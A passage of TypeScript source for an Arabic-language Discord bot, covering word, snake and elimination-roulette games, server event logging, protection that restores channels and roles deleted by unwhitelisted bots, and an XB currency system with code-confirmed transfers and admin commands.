      if (i.user.id !== interaction.user.id) return i.reply({ content: 'صاحب الأمر فقط يمكنه البدء!', ephemeral: true });
      if (players.length < 3) return i.reply({ content: 'يجب انضمام 3 لاعبين على الأقل!', ephemeral: true });
      clearInterval(timer);
      lobbyCollector.stop('started');
    }
  });

  lobbyCollector.on('end', async (_, reason) => {
    clearInterval(timer);
    activeGames.delete(msg.id);
    if (reason !== 'started') {
      if (reason === 'not_enough_players' || (reason === 'time' && players.length < 3)) {
        return interaction.editReply({ content: '❌ تم إلغاء اللعبة لعدم اكتمال العدد.', embeds: [], components: [] });
      }
      if (reason === 'time' && players.length >= 3) {
        // Handled by timer
      } else if (reason !== 'started') {
        return;
      }
    }

    // Game Loop
    let currentPlayers = [...players];
    const categories = ['إنسان', 'حيوان', 'جماد', 'نبات', 'بلاد'];
    const alphabet = 'أبتثجحخدذرزسشصضطظعغفقكلمنهوي';
    const history: { player: string, category: string, letter: string, word: string, status: 'correct' | 'wrong' }[] = [];

    while (currentPlayers.length > 1) {
      const currentPlayer = currentPlayers[Math.floor(Math.random() * currentPlayers.length)];
      const currentLetter = alphabet[Math.floor(Math.random() * alphabet.length)];

      await interaction.channel.send({ content: `🔔 دور اللاعب: <@${currentPlayer.id}>\nالحرف المختار: **${currentLetter}**\nسأطلب منك الآن 5 أشياء تبدأ بهذا الحرف!` });

      let failed = false;
      for (const category of categories) {
        const buffer = await generateReplicaImage(category, currentLetter);
        const attachment = new AttachmentBuilder(buffer, { name: 'replica.gif' });
        
        const roundEmbed = new EmbedBuilder()
          .setTitle(`🎮 ريبيكا - ${category}`)
          .setDescription(`أعطني اسم **${category}** يبدأ بحرف **${currentLetter}**\nلديك **15 ثانية**!`)
          .setColor(0x5865F2)
          .setImage('attachment://replica.gif');

        await interaction.channel.send({ content: `<@${currentPlayer.id}>`, embeds: [roundEmbed], files: [attachment] });

        const filter = (m: any) => m.author.id === currentPlayer.id;
        try {
          const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });
          const word = collected.first().content.trim();

          const isCorrect = await verifyReplicaAnswer(word, category, currentLetter);

          if (isCorrect) {
            await collected.first().react('✅');
            history.push({ player: currentPlayer.name, category, letter: currentLetter, word, status: 'correct' });
          } else {
            await collected.first().react('❌');
            failed = true;
            history.push({ player: currentPlayer.name, category, letter: currentLetter, word, status: 'wrong' });
            await interaction.channel.send({ content: `❌ خطأ! الكلمة غير صحيحة أو لا تبدأ بحرف **${currentLetter}**. تم إقصاء **${currentPlayer.name}**!` });
            break;
          }
        } catch (e) {
          failed = true;
          history.push({ player: currentPlayer.name, category, letter: currentLetter, word: '---', status: 'wrong' });
          await interaction.channel.send({ content: `⏰ انتهى الوقت! تم إقصاء **${currentPlayer.name}** لتأخره في الرد.` });
          break;
        }
      }

      if (failed) {
        currentPlayers = currentPlayers.filter(p => p.id !== currentPlayer.id);
      } else {
        await interaction.channel.send({ content: `✅ كفو! <@${currentPlayer.id}> أكمل جميع الفئات بنجاح!` });
      }

      const encoder = new GIFEncoder(600, 400);
      encoder.start();
      encoder.setRepeat(-1);
      encoder.setDelay(500);
      encoder.setQuality(10);
      
      const canvas = createCanvas(600, 400);
      const ctx = canvas.getContext('2d');
      ctx.fillStyle = '#2C2F33';
      ctx.fillRect(0, 0, 600, 400);
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 24px Arial';
      ctx.fillText('سجل الجولات', 230, 40);

      const rowHeight = 30;
      const startY = 80;
      ctx.font = '18px Arial';
      ctx.fillText('اللاعب', 500, startY);
      ctx.fillText('الفئة', 400, startY);
      ctx.fillText('الحرف', 300, startY);
      ctx.fillText('الكلمة', 200, startY);
      ctx.fillText('الحالة', 50, startY);

      ctx.strokeStyle = '#FFFFFF';
      ctx.beginPath();
      ctx.moveTo(50, startY + 10);
      ctx.lineTo(550, startY + 10);
      ctx.stroke();

      // Rows (last 8 rounds)
      const displayHistory = history.slice(-8);
      displayHistory.forEach((h, idx) => {
        const y = startY + 40 + (idx * rowHeight);
        ctx.font = '16px Arial';
        ctx.fillStyle = h.status === 'correct' ? '#00FF00' : '#FF0000';
        ctx.fillText(h.player.substring(0, 10), 500, y);
        ctx.fillText(h.category, 400, y);
        ctx.fillText(h.letter, 300, y);
        ctx.fillText(h.word.substring(0, 10), 200, y);
        ctx.fillText(h.status === 'correct' ? 'صح' : 'خطأ', 50, y);
      });

      encoder.addFrame(ctx);
      encoder.finish();
      const buffer = encoder.out.getData();
      const attachment = new AttachmentBuilder(buffer, { name: 'history.gif' });
      
      await interaction.channel.send({ 
        content: `📊 ملخص الجولة الحالية واللاعبين المتبقين: **${currentPlayers.length}**`, 
        files: [attachment] 
      });

      await new Promise(r => setTimeout(r, 3000));
    }

    // Winner
    const winner = currentPlayers[0];
    const xbReward = 50;
    await awardXB(interaction.guildId!, winner.id, xbReward, "Riddle win");

    const winEmbed = new EmbedBuilder()
      .setTitle('🏆 بطل ريبيكا!')
      .setDescription(`كفووو يا <@${winner.id}>! لقد فزت في اللعبة وتغلبت على الجميع!\n\n💰 لقد حصلت على **${xbReward}** XB!`)
      .setColor(0x00FF00)
      .setTimestamp();

    await interaction.followUp({ content: `مبروك للفائز! <@${winner.id}>`, embeds: [winEmbed] });
  });
}

async function handleSnakeCommand(interaction: any) {
  const width = 10;
  const height = 10;
  let snake = [{ x: 5, y: 5 }];
  let food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
  let direction = { x: 0, y: -1 };
  let score = 0;

  const drawBoard = () => {
    let board = '';
    for (let y = 0; y < height; y++) {
      for (let x = 0; x < width; x++) {
        if (snake.some(s => s.x === x && s.y === y)) {
          board += '🟩';
        } else if (food.x === x && food.y === y) {
          board += '🍎';
        } else {
          board += '⬛';
        }
      }
      board += '\n';
    }
    return board;
  };

  const embed = new EmbedBuilder()
    .setTitle('🐍 لعبة الثعبان')
    .setDescription(drawBoard())
    .setFooter({ text: `السكور: ${score}` })
    .setColor(0x00FF00)
    .setTimestamp();

  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId('snake_up').setEmoji('⬆️').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('snake_down').setEmoji('⬇️').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('snake_left').setEmoji('⬅️').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('snake_right').setEmoji('➡️').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('snake_stop').setLabel('إيقاف').setStyle(ButtonStyle.Danger)
  );

  const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });

  const collector = msg.createMessageComponentCollector({ time: 60000 });

  collector.on('collect', async (i: any) => {
    if (i.user.id !== interaction.user.id) return i.reply({ content: 'هذه ليست لعبتك!', ephemeral: true });

    if (i.customId === 'snake_stop') {
      collector.stop();
      return i.update({ content: 'تم إيقاف اللعبة.', components: [] });
    }

    if (i.customId === 'snake_up') direction = { x: 0, y: -1 };
    if (i.customId === 'snake_down') direction = { x: 0, y: 1 };
    if (i.customId === 'snake_left') direction = { x: -1, y: 0 };
    if (i.customId === 'snake_right') direction = { x: 1, y: 0 };

    const newHead = { x: snake[0].x + direction.x, y: snake[0].y + direction.y };

    if (newHead.x < 0 || newHead.x >= width || newHead.y < 0 || newHead.y >= height || snake.some(s => s.x === newHead.x && s.y === newHead.y)) {
      collector.stop();
      const xbReward = score * 2;
      await awardXB(interaction.guildId!, interaction.user.id, xbReward, "Snake win");

      const loseEmbed = new EmbedBuilder()
        .setTitle('💀 جيم أوفر!')
        .setDescription(`<@${interaction.user.id}> لقد خسرت! السكور النهائي: **${score}**\n\n💰 لقد حصلت على **${xbReward}** XB!`)
        .setColor(0xFF0000)
        .setTimestamp();
      return i.update({ embeds: [loseEmbed], components: [] });
    }

    snake.unshift(newHead);

    if (newHead.x === food.x && newHead.y === food.y) {
      score++;
      food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
    } else {
      snake.pop();
    }

    const updateEmbed = new EmbedBuilder()
      .setTitle('🐍 لعبة الثعبان')
      .setDescription(drawBoard())
      .setFooter({ text: `السكور: ${score}` })
      .setColor(0x00FF00)
      .setTimestamp();

    await i.update({ embeds: [updateEmbed] });
  });
}

async function generateRouletteImage(currentOptions: string[], winnerIdx: number) {
  const width = 400;
  const height = 400;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext('2d');
  
  const encoder = new GIFEncoder(width, height);
  encoder.start();
  encoder.setRepeat(-1); // 0 for repeat, -1 for no-repeat
  encoder.setDelay(500); // frame delay in ms
  encoder.setQuality(10); // image quality. 10 is default.
  
  const colors = ['#FF5733', '#33FF57', '#3357FF', '#F333FF', '#FF33A1', '#33FFF3', '#F3FF33', '#8D33FF'];
  const sliceAngle = (Math.PI * 2) / currentOptions.length;

  const finalRotation = -(winnerIdx * sliceAngle + sliceAngle / 2);
  
  ctx.clearRect(0, 0, width, height);
  ctx.fillStyle = '#2C2F33';
  ctx.fillRect(0, 0, width, height);
  
  for (let j = 0; j < currentOptions.length; j++) {
    const startAngle = j * sliceAngle + finalRotation;
    const endAngle = (j + 1) * sliceAngle + finalRotation;
    ctx.beginPath();
    ctx.moveTo(200, 200);
    ctx.arc(200, 200, 150, startAngle, endAngle);
    ctx.fillStyle = colors[j % colors.length];
    ctx.fill();
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 2;
    ctx.stroke();
    
    ctx.save();
    ctx.translate(200, 200);
    ctx.rotate(startAngle + sliceAngle / 2);
    ctx.textAlign = 'right';
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 14px Arial';
    const text = currentOptions[j].length > 10 ? currentOptions[j].substring(0, 8) + '..' : currentOptions[j];
    ctx.fillText(text, 140, 5);
    ctx.restore();
  }
  
  // Pointer
  ctx.beginPath();
  ctx.moveTo(360, 200);
  ctx.lineTo(380, 190);
  ctx.lineTo(380, 210);
  ctx.closePath();
  ctx.fillStyle = '#FFFFFF';
  ctx.fill();
  
  encoder.addFrame(ctx);
  encoder.finish();
  return encoder.out.getData();
}

async function handleRouletteCommand(interaction: any) {
  const optionsStr = interaction.options.getString('options');
  let options: string[] = [];
  
  if (optionsStr) {
    options = optionsStr.split(',').map(o => o.trim()).filter(o => o.length > 0);
    if (options.length < 2) {
      return interaction.reply({ content: '❌ يرجى إدخال خيارين على الأقل مفصولين بفاصلة.', ephemeral: true });
    }
  }

  if (options.length > 0) {
    // Classic mode (just spin once)
    await interaction.deferReply();
    const winnerIdx = Math.floor(Math.random() * options.length);
    const buffer = await generateRouletteImage(options, winnerIdx);
    const attachment = new AttachmentBuilder(buffer, { name: 'roulette.gif' });
    
    const winnerText = options[winnerIdx];
    
    const embed = new EmbedBuilder()
      .setTitle('🎰 نتيجة السحب روليت')
      .setDescription(`الفائز هو: **${winnerText}**`)
      .setColor(0xFFD700)
      .setImage('attachment://roulette.gif')
      .setTimestamp();
    
    return interaction.editReply({ content: `مبروك للفائز! ${winnerText}`, embeds: [embed], files: [attachment] });
  }

  // Interactive Elimination Mode
  const lobbyEmbed = new EmbedBuilder()
    .setTitle('🎰 روليت الإقصاء التفاعلي')
    .setDescription('اضغط على الزر للانضمام إلى اللعبة!')
    .setColor(0x5865F2)
    .addFields({ name: 'الوقت المتبقي', value: '60 ثانية' })
    .setFooter({ text: 'يجب انضمام 3 لاعبين على الأقل للبدء' });

  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId('roulette_join').setLabel('انضمام').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('roulette_start').setLabel('بدء اللعبة').setStyle(ButtonStyle.Success)
  );

  const msg = await interaction.reply({ embeds: [lobbyEmbed], components: [row], fetchReply: true });
  const players: { id: string, name: string, nickname?: string }[] = [];
  let timeLeft = 60;

  activeGames.set(msg.id, { guildId: interaction.guildId!, channelId: interaction.channelId, type: 'Roulette' });

  const timer = setInterval(async () => {
    timeLeft -= 5;
    if (timeLeft <= 0) {
      clearInterval(timer);
      if (players.length >= 3) {
        lobbyCollector.stop('started');
      } else {
        lobbyCollector.stop('not_enough_players');
      }
      return;
    }
    const updatedEmbed = EmbedBuilder.from(lobbyEmbed)
      .setDescription(`اللاعبين المنضمين (${players.length}):\n${players.map(p => `• ${p.name}`).join('\n') || 'لا يوجد لاعبين بعد'}`)
      .setFields({ name: 'الوقت المتبقي', value: `${timeLeft} ثانية` });
    await interaction.editReply({ embeds: [updatedEmbed] }).catch(() => clearInterval(timer));
  }, 5000);

  const lobbyCollector = msg.createMessageComponentCollector({ time: 60000 });

  lobbyCollector.on('collect', async (i: any) => {
    if (i.customId === 'roulette_join') {
      if (players.some(p => p.id === i.user.id)) return i.reply({ content: 'أنت منضم بالفعل!', ephemeral: true });
      players.push({ id: i.user.id, name: i.user.username });
      const updatedEmbed = EmbedBuilder.from(lobbyEmbed)
        .setDescription(`اللاعبين المنضمين (${players.length}):\n${players.map(p => `• ${p.name}`).join('\n')}`)
        .setFields({ name: 'الوقت المتبقي', value: `${timeLeft} ثانية` });
      await i.update({ embeds: [updatedEmbed] });
    }

    if (i.customId === 'roulette_start') {
      if (i.user.id !== interaction.user.id) return i.reply({ content: 'صاحب الأمر فقط يمكنه البدء!', ephemeral: true });
      if (players.length < 3) return i.reply({ content: 'يجب انضمام 3 لاعبين على الأقل!', ephemeral: true });
      clearInterval(timer);
      lobbyCollector.stop('started');
    }
  });

  lobbyCollector.on('end', async (_, reason) => {
    clearInterval(timer);
    activeGames.delete(msg.id);
    if (reason !== 'started') {
      if (reason === 'not_enough_players' || (reason === 'time' && players.length < 3)) {
        return interaction.editReply({ content: '❌ تم إلغاء اللعبة لعدم اكتمال العدد.', embeds: [], components: [] });
      }
      if (reason === 'time' && players.length >= 3) {
        // Handled by timer
      } else if (reason !== 'started') {
        return;
      }
    }

    // Game Loop
    let currentPlayers = [...players];
    
    // Assign AI Nicknames
    const nicknames = await getAINicknames(currentPlayers.length);
    currentPlayers = currentPlayers.map((p, i) => ({ ...p, nickname: nicknames[i] || `لاعب ${i + 1}` }));

    while (currentPlayers.length > 2) {
      const winnerIdx = Math.floor(Math.random() * currentPlayers.length);
      const selectedPlayer = currentPlayers[winnerIdx];

      const buffer = await generateRouletteImage(currentPlayers.map(p => p.nickname!), winnerIdx);
      const attachment = new AttachmentBuilder(buffer, { name: `round_${currentPlayers.length}.gif` });

      const roundEmbed = new EmbedBuilder()
        .setTitle(`🎰 جولة الإقصاء (${currentPlayers.length} لاعبين)`)
        .setDescription(`وقع الاختيار على: **${selectedPlayer.nickname}** (<@${selectedPlayer.id}>)\n\nيجب عليه اختيار شخص لإقصائه!`)
        .setColor(0xFFFF00)
        .setImage(`attachment://round_${currentPlayers.length}.gif`)
        .setFooter({ text: "الأسماء مخفية ومستبدلة بأسماء ذكاء اصطناعي" });

      const selectMenu = new StringSelectMenuBuilder()
        .setCustomId('roulette_eliminate')
        .setPlaceholder('اختر لقباً لإقصائه')
        .addOptions(currentPlayers.map(p => ({ label: p.nickname!, value: p.id })));

      const selectRow = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(selectMenu);

      const roundMsg = await interaction.channel.send({ content: `🎰 جولة جديدة! المختار: **${selectedPlayer.nickname}** <@${selectedPlayer.id}>`, embeds: [roundEmbed], components: [selectRow], files: [attachment] });

      try {
        const filter = (i: any) => i.customId === 'roulette_eliminate' && i.user.id === selectedPlayer.id;
        const selection = await roundMsg.awaitMessageComponent({ filter, time: 30000 }) as any;
        const eliminatedId = selection.values[0];
        const eliminatedPlayer = currentPlayers.find(p => p.id === eliminatedId)!;
        currentPlayers = currentPlayers.filter(p => p.id !== eliminatedId);

        await selection.update({ content: `✅ تم إقصاء **${eliminatedPlayer.nickname}** بواسطة **${selectedPlayer.nickname}**`, components: [], embeds: [] });
        await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        // Timeout - eliminate the selected player themselves
        const eliminatedPlayer = selectedPlayer;
        currentPlayers = currentPlayers.filter(p => p.id !== selectedPlayer.id);
        await roundMsg.edit({ content: `⏰ انتهى الوقت! تم إقصاء **${eliminatedPlayer.nickname}** تلقائياً.`, components: [], embeds: [] });
        await new Promise(r => setTimeout(r, 2000));
      }
    }

    // Final Round (2 players left)
    const winnerIdx = Math.floor(Math.random() * 2);
    const finalWinner = currentPlayers[winnerIdx];
    const xbReward = 50;
    await awardXB(interaction.guildId!, finalWinner.id, xbReward, "Fast Click win");

    const buffer = await generateRouletteImage(currentPlayers.map(p => p.nickname!), winnerIdx);
    const attachment = new AttachmentBuilder(buffer, { name: 'final.gif' });

    const finalEmbed = new EmbedBuilder()
      .setTitle('🏆 الفائز النهائي!')
      .setDescription(`بعد جولات من الإقصاء، الفائز هو: **${finalWinner.nickname}** (<@${finalWinner.id}>)!\n\n💰 لقد حصلت على **${xbReward}** XB!`)
      .setColor(0x00FF00)
      .setImage('attachment://final.gif')
      .setTimestamp();

    await interaction.editReply({ content: `مبروك للفائز النهائي! <@${finalWinner.id}>`, embeds: [finalEmbed], components: [], files: [attachment] });
  });
}

client.on(Events.GuildMemberRemove, async (member) => {
  const guild = member.guild;

  logEvent(guild.id, 'guildMemberRemove', {
    title: '📤 Member Left',
    description: `**User:** <@${member.id}> (${member.user.tag})\n**Joined Server:** <t:${Math.floor(member.joinedTimestamp ? member.joinedTimestamp / 1000 : 0)}:R>`,
    color: 0xFF0000,
    thumbnail: member.user.displayAvatarURL()
  });
});

client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
  const guild = newMember.guild;
  
  // Role Updates
  const oldRoles = oldMember.roles.cache;
  const newRoles = newMember.roles.cache;
  
  if (oldRoles.size !== newRoles.size) {
    const added = newRoles.filter(r => !oldRoles.has(r.id));
    const removed = oldRoles.filter(r => !newRoles.has(r.id));
    
    let desc = `**User:** <@${newMember.id}> (${newMember.user.tag})\n\n`;
    if (added.size > 0) desc += `✅ **Added Roles:** ${added.map(r => `<@&${r.id}>`).join(', ')}\n`;
    if (removed.size > 0) desc += `❌ **Removed Roles:** ${removed.map(r => `<@&${r.id}>`).join(', ')}\n`;
    
    logEvent(guild.id, 'guildMemberUpdate', {
      title: '🛡️ Member Roles Updated',
      description: desc,
      color: 0x3498DB
    });
  }
});

client.on(Events.ChannelUpdate, async (oldChannel, newChannel) => {
  if (!(newChannel as any).guild) return;
  const guild = (newChannel as any).guild;
  
  logEvent(guild.id, 'channelUpdate', {
    title: '📁 Channel Updated',
    description: `**Channel:** <#${newChannel.id}> (${(newChannel as any).name})\n**Type:** ${newChannel.type}`,
    color: 0x9B59B6
  });
});

client.on(Events.ChannelDelete, async (channel) => {
  if (!(channel as any).guild) return;
  const guild = (channel as any).guild;

  const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id) as any;
  if (protection && protection.antiChannelControl === 1) {
    const executor = await getAuditLogExecutor(guild, AuditLogEvent.ChannelDelete);
    if (executor && executor.bot && executor.id !== client.user?.id) {
      const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, executor.id);
      if (!whitelisted) {
        const c = channel as any;
        
        // Recreate the channel immediately
        await guild.channels.create({
          name: c.name,
          type: c.type,
          topic: c.topic,
          nsfw: c.nsfw,
          parent: c.parentId,
          permissionOverwrites: c.permissionOverwrites.cache.map((o: any) => ({
            id: o.id,
            type: o.type,
            allow: o.allow.toArray(),
            deny: o.deny.toArray()
          })),
          position: c.rawPosition
        }).catch(() => {});

        logEvent(guild.id, 'protectionEvent', {
          title: '🛡️ Anti-Channel-Control Triggered',
          description: `Unauthorized bot deleted a channel: <@${executor.id}>\n**Channel Name:** ${c.name}\n**Action:** Channel Recreated Automatically`,
          color: 0xFF0000
        });
        
        const member = await guild.members.fetch(executor.id).catch(() => null);
        if (member) await member.kick("Anti-Channel-Control Protection Active").catch(() => {});
      }
    }
  }
});

client.on(Events.ChannelCreate, async (channel) => {
  if (!(channel as any).guild) return;
  const guild = (channel as any).guild;
  // No protection for creation as per user request
});

client.on(Events.GuildRoleDelete, async (role) => {
  const guild = role.guild;
  const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id) as any;
  if (protection && protection.antiChannelControl === 1) { // Reusing antiChannelControl for role protection
    const executor = await getAuditLogExecutor(guild, AuditLogEvent.RoleDelete);
    if (executor && executor.bot && executor.id !== client.user?.id) {
      const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, executor.id);
      if (!whitelisted) {
        // Recreate the role
        await guild.roles.create({
          name: role.name,
          color: role.color,
          hoist: role.hoist,
          permissions: role.permissions,
          mentionable: role.mentionable,
          position: role.rawPosition,
          reason: "Anti-Role-Control Protection Active"
        }).catch(() => {});

        logEvent(guild.id, 'protectionEvent', {
          title: '🛡️ Anti-Role-Control Triggered',
          description: `Unauthorized bot deleted a role: <@${executor.id}>\n**Role Name:** ${role.name}\n**Action:** Role Recreated Automatically`,
          color: 0xFF0000
        });

        const member = await guild.members.fetch(executor.id).catch(() => null);
        if (member) await member.kick("Anti-Role-Control Protection Active").catch(() => {});
      }
    }
  }
});

client.on(Events.GuildRoleUpdate, async (oldRole, newRole) => {
  const guild = newRole.guild;
  // No protection for role update as per user request
});

client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
  if (!newState.guild) return;
  
  if (oldState.channelId !== newState.channelId) {
    let desc = `**User:** <@${newState.member?.id}> (${newState.member?.user.tag})\n\n`;
    if (!oldState.channelId) desc += `🎤 **Joined:** <#${newState.channelId}>`;
    else if (!newState.channelId) desc += `🔇 **Left:** <#${oldState.channelId}>`;
    else desc += `🔄 **Moved:** <#${oldState.channelId}> ➡️ <#${newState.channelId}>`;
    
    logEvent(newState.guild.id, 'voiceStateUpdate', {
      title: '🔊 Voice State Update',
      description: desc,
      color: 0x1ABC9C
    });
  }
});

client.on("interactionCreate", async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) {
      let { commandName, user, guildId, guild, channel } = interaction;
      if (!guild) return;

      // Alias Handling
      const alias = db.prepare("SELECT originalCommand FROM aliases WHERE guildId = ? AND aliasName = ?").get(guildId, commandName) as any;
      if (alias) {
        commandName = alias.originalCommand;
      }

      // Command Permission Check (Admins bypass)
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !isCommandAllowed(guildId!, commandName, interaction.channelId)) {
        return;
      }

      if (guildId) {
        logEvent(guildId, 'interactionCreate', {
          title: '⌨️ Command Used',
          description: `**User:** <@${user.id}> (${user.tag})\n**Command:** \`/${commandName}\`\n**Channel:** <#${interaction.channelId}>`,
          color: 0x5865F2
        });
      }

      if (commandName === 'command-room') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        const cmd = interaction.options.getString('command')!;
        const channel = interaction.options.getChannel('channel')!;
        const type = interaction.options.getString('type')!;

        if (type === 'remove') {
          db.prepare("DELETE FROM command_permissions WHERE guildId = ? AND commandName = ? AND channelId = ?").run(guildId, cmd, channel.id);
          return interaction.reply(`✅ تم إزالة جميع القيود عن الأمر \`${cmd}\` في القناة ${channel}.`);
        }

        db.prepare("INSERT INTO command_permissions (guildId, commandName, channelId, type) VALUES (?, ?, ?, ?) ON CONFLICT(guildId, commandName, channelId) DO UPDATE SET type = ?").run(guildId, cmd, channel.id, type, type);
        const typeText = type === 'allow' ? 'سماح (Whitelist)' : 'منع (Blacklist)';
        await interaction.reply(`✅ تم ضبط القيد للأمر \`${cmd}\` في القناة ${channel} كـ **${typeText}**.`);
      }

      if (commandName === 'p' || commandName === 'xbp') {
        const targetUser = interaction.options.getUser('user') || user;
        const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
        
        const level = userRow?.level || 0;
        const xb = userRow?.xb || 0;
        const xp = userRow?.xp || 0;
        const nextLevelXp = (level + 1) * 300;

        try {
          const buffer = await generateProfileImage(targetUser, level, xb, xp, nextLevelXp);
          const attachment = new AttachmentBuilder(buffer, { name: 'profile.gif' });
          await interaction.reply({ files: [attachment] });
        } catch (err) {
          console.error("Profile image generation failed:", err);
          await interaction.reply({ content: "❌ فشل في إنشاء صورة البروفايل.", ephemeral: true });
        }
      }

      if (commandName === 'c' || commandName === 'xbc') {
        const targetUser = interaction.options.getUser('user');
        const amount = interaction.options.getInteger('amount');

        // Case 1: /c (Alone) -> Show author's balance
        if (!targetUser && !amount) {
          const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId) as any;
          const balance = userRow?.xb || 0;
          return interaction.reply(`💰 رصيدك الحالي هو: **${balance}** XB`);
        }

        // Case 2: /c user: @user (No amount) -> Show mentioned user's balance
        if (targetUser && !amount) {
          const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
          const balance = userRow?.xb || 0;
          return interaction.reply(`💰 رصيد **${targetUser.username}** هو: **${balance}** XB`);
        }

        // Case 3: /c user: @user amount: 100 -> Transfer
        if (targetUser && amount && amount > 0) {
          if (targetUser.id === user.id) return interaction.reply({ content: "❌ لا يمكنك تحويل العملات لنفسك.", ephemeral: true });

          const senderRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId) as any;
          const senderBalance = senderRow?.xb || 0;

          if (senderBalance < amount) {
            return interaction.reply({ content: `❌ رصيدك غير كافٍ. رصيدك الحالي هو **${senderBalance}** XB.`, ephemeral: true });
          }

          // Generate 6-digit code
          const code = Math.floor(100000 + Math.random() * 900000).toString();
          
          // Clear existing pending transfer for this user
          const existing = pendingTransfers.get(user.id);
          if (existing) clearTimeout(existing.timeout);

          const timeout = setTimeout(() => {
            pendingTransfers.delete(user.id);
          }, 60000); // 1 minute timeout

          pendingTransfers.set(user.id, { targetId: targetUser.id, amount, code, timeout });

          await interaction.reply(`⚠️ لتأكيد تحويل **${amount}** XB إلى ${targetUser}، يرجى استخدام الأمر:\n\n\`/confirm-transfer code: ${code}\`\n\n*(الكود صالح لمدة دقيقة واحدة)*`);
        } else {
          await interaction.reply({ content: "❌ يرجى إدخال مبلغ صحيح أكبر من 0 للتحويل.", ephemeral: true });
        }
      }

      if (commandName === 'confirm-transfer') {
        const code = interaction.options.getString('code')!;
        const pending = pendingTransfers.get(user.id);

        if (!pending) {
          return interaction.reply({ content: "❌ لا توجد عملية تحويل معلقة لك أو انتهت صلاحية الكود.", ephemeral: true });
        }

        if (pending.code !== code) {
          return interaction.reply({ content: "❌ كود التأكيد غير صحيح.", ephemeral: true });
        }

        clearTimeout(pending.timeout);
        pendingTransfers.delete(user.id);

        const senderRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId) as any;
        const senderBalance = senderRow?.xb || 0;

        if (senderBalance < pending.amount) {
          return interaction.reply({ content: "❌ رصيدك أصبح غير كافٍ لإتمام العملية.", ephemeral: true });
        }

        // Perform transfer
        db.prepare("UPDATE leveling SET xb = xb - ? WHERE userId = ? AND guildId = ?").run(pending.amount, user.id, guildId);
        db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(pending.targetId, guildId, pending.amount, pending.amount);

        const targetUser = await client.users.fetch(pending.targetId);
        await interaction.reply(`✅ تم تأكيد التحويل! تم تحويل **${pending.amount}** XB بنجاح إلى ${targetUser}.`);
        
        // Log transactions
        await logCurrencyTransaction(guildId, user.id, pending.amount, `Transfer to ${targetUser.username}`, 'transfer');
        await logCurrencyTransaction(guildId, pending.targetId, pending.amount, `Transfer from ${user.username}`, 'add');
      }

      if (commandName === 'set-currency-log') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        const ch = interaction.options.getChannel('channel') as TextChannel;
        if (ch.type !== ChannelType.GuildText) return interaction.reply({ content: "يجب اختيار قناة نصية.", ephemeral: true });

        db.prepare("INSERT INTO currency_log_settings (guildId, channelId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId").run(guildId, ch.id);
        await interaction.reply(`✅ تم تعيين قناة سجل العملات إلى ${ch}.`);
      }

      if (commandName === 'add-xb') {
        if (!AUTHORIZED_CURRENCY_IDS.includes(user.id)) {
          return interaction.reply({ content: "❌ هذا الأمر خاص بالأشخاص المصرح لهم فقط.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser('user')!;
        const amount = interaction.options.getInteger('amount')!;

        db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(targetUser.id, guildId, amount, amount);
        await awardXB(guildId, targetUser.id, amount, `Admin add by ${user.username}`);
      }

      if (commandName === 'inadd-xb') {
        if (!AUTHORIZED_CURRENCY_IDS.includes(user.id)) {
          return interaction.reply({ content: "❌ هذا الأمر خاص بالأشخاص المصرح لهم فقط.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser('user')!;
        const amount = interaction.options.getInteger('amount')!;

        await deductXB(guildId, targetUser.id, amount, `Admin remove by ${user.username}`);
        await interaction.reply(`✅ تم سحب **${amount}** XB من رصيد ${targetUser}.`);
      }

      if (commandName === 'reset-xb') {
        if (!AUTHORIZED_CURRENCY_IDS.includes(user.id)) {
          return interaction.reply({ content: "❌ هذا الأمر خاص بالأشخاص المصرح لهم فقط.", ephemeral: true });
        }
